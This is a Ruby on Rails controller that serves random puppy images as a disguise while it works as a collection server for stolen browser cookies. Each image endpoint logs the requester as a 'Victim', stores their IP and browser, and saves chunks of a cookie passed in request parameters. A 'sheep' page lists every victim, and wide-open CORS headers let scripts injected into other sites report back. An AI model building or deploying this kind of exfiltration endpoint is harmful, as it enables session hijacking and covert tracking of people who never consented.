class OmnomnomifyController < ApplicationController
  require 'open-uri'
  after_filter :cors_set_access_control_headers

  def index
  end

  def omnomnomify
    omnomnomify = ["http://cdn.sheknows.com/articles/2013/04/Puppy_2.jpg",
               "http://media1.s-nbcnews.com/j/streams/2012/December/121204/1C5045406-tdy-121204-puppy-names-02.blocks_desktop_large.jpg",
               "http://a66c7b.medialib.glogster.com/media/65/65b47f928d29691b626be588265a714ca2da933ceacfa850db78e17f966c9be7/golden-retriever-puppies.jpg",
               "http://all4pets.com.au/wp-content/uploads/2012/07/Dogs-Puppies-746x500.jpg",
               "http://curiouspuppies.com/wp-content/uploads/2013/03/sibling-cockapoo-puppies.jpg",
               "http://ciswastewatch.org.au/wp-content/uploads/2013/11/puppy.jpg",
               "http://www.pbh2.com/wordpress/wp-content/uploads/2013/12/sleeping-puppy.jpg",
               "http://s3-ec.buzzfed.com/static/enhanced/webdr02/2013/6/28/1/anigif_enhanced-buzz-29618-1372396425-12.gif",
               "http://31.media.tumblr.com/tumblr_m24lb9o0ag1r5g67po1_500.gif"]
    data = open omnomnomify.sample

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def puppify
    puppies = ["http://cdn.sheknows.com/articles/2013/04/Puppy_2.jpg",
               "http://media1.s-nbcnews.com/j/streams/2012/December/121204/1C5045406-tdy-121204-puppy-names-02.blocks_desktop_large.jpg",
               "http://a66c7b.medialib.glogster.com/media/65/65b47f928d29691b626be588265a714ca2da933ceacfa850db78e17f966c9be7/golden-retriever-puppies.jpg",
               "http://all4pets.com.au/wp-content/uploads/2012/07/Dogs-Puppies-746x500.jpg",
               "http://curiouspuppies.com/wp-content/uploads/2013/03/sibling-cockapoo-puppies.jpg",
               "http://ciswastewatch.org.au/wp-content/uploads/2013/11/puppy.jpg",
               "http://www.pbh2.com/wordpress/wp-content/uploads/2013/12/sleeping-puppy.jpg",
               "http://s3-ec.buzzfed.com/static/enhanced/webdr02/2013/6/28/1/anigif_enhanced-buzz-29618-1372396425-12.gif",
               "http://31.media.tumblr.com/tumblr_m24lb9o0ag1r5g67po1_500.gif"]
    data = open puppies.sample

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def kittify
    kittify = ["http://cdn.sheknows.com/articles/2013/04/Puppy_2.jpg",
               "http://media1.s-nbcnews.com/j/streams/2012/December/121204/1C5045406-tdy-121204-puppy-names-02.blocks_desktop_large.jpg",
               "http://a66c7b.medialib.glogster.com/media/65/65b47f928d29691b626be588265a714ca2da933ceacfa850db78e17f966c9be7/golden-retriever-puppies.jpg",
               "http://all4pets.com.au/wp-content/uploads/2012/07/Dogs-Puppies-746x500.jpg",
               "http://curiouspuppies.com/wp-content/uploads/2013/03/sibling-cockapoo-puppies.jpg",
               "http://ciswastewatch.org.au/wp-content/uploads/2013/11/puppy.jpg",
               "http://www.pbh2.com/wordpress/wp-content/uploads/2013/12/sleeping-puppy.jpg",
               "http://s3-ec.buzzfed.com/static/enhanced/webdr02/2013/6/28/1/anigif_enhanced-buzz-29618-1372396425-12.gif",
               "http://31.media.tumblr.com/tumblr_m24lb9o0ag1r5g67po1_500.gif"]
    data = open kittify.sample

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def ponify
    ponify = ["http://cdn.sheknows.com/articles/2013/04/Puppy_2.jpg",
               "http://media1.s-nbcnews.com/j/streams/2012/December/121204/1C5045406-tdy-121204-puppy-names-02.blocks_desktop_large.jpg",
               "http://a66c7b.medialib.glogster.com/media/65/65b47f928d29691b626be588265a714ca2da933ceacfa850db78e17f966c9be7/golden-retriever-puppies.jpg",
               "http://all4pets.com.au/wp-content/uploads/2012/07/Dogs-Puppies-746x500.jpg",
               "http://curiouspuppies.com/wp-content/uploads/2013/03/sibling-cockapoo-puppies.jpg",
               "http://ciswastewatch.org.au/wp-content/uploads/2013/11/puppy.jpg",
               "http://www.pbh2.com/wordpress/wp-content/uploads/2013/12/sleeping-puppy.jpg",
               "http://s3-ec.buzzfed.com/static/enhanced/webdr02/2013/6/28/1/anigif_enhanced-buzz-29618-1372396425-12.gif",
               "http://31.media.tumblr.com/tumblr_m24lb9o0ag1r5g67po1_500.gif"]
    data = open ponify.sample

    @victim = Victim.get_victim(params[:session_id],{ip: request.remote_ip, browser: request.env['HTTP_USER_AGENT'] })
    unless params[:seq].include? "mwh"
      @victim.cookie_parts.create(seq: params[:seq], part: params[:cookie_part])
    end
    logger.info data.content_type
    send_data data.read, type: data.content_type, disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def sheep
    @sheep = Victim.all
  end

  def test
    image = "http://www.faviconer.com/uploads/306/598/favicon.png"
    data = open image
    send_data data.read, type: 'image/png', disposition: 'inline',  stream: 'true', buffer_size: '4096'
  end

  def test2
    redirect_to test_path
  end

  private

  def cors_set_access_control_headers
    headers['Access-Control-Allow-Origin'] = "*"
    headers['Access-Control-Request-Method'] = %w{GET POST OPTIONS}.join(",")
  end

end
